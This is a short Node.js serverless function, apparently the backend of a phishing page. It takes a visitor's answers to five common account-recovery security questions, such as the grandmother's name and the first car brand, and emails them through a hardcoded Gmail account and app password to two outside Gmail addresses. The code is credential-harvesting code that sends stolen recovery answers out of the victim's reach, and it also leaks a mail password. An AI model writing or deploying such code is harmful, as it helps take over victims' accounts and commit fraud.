const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { favoriteCharacter, firstCarBrand, favoriteColor, grandmotherName, schoolName } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jazzysell123@gmail.com',
            pass: 'dfbcartjozqoeudc',
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com, fendergriseldo@gmail.com',
        subject: 'Respuestas de Seguridad',
        text: `
¿Cuál es el personaje de su libro favorito?:
${favoriteCharacter}

¿Cuál es la marca de su primer carro?:
${firstCarBrand}

¿Cuál es su color favorito?:
${favoriteColor}

¿Cuál es el nombre de su abuela materna?:
${grandmotherName}

¿Nombre del colegio donde cursó la primaria?: 
${schoolName}
        `,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
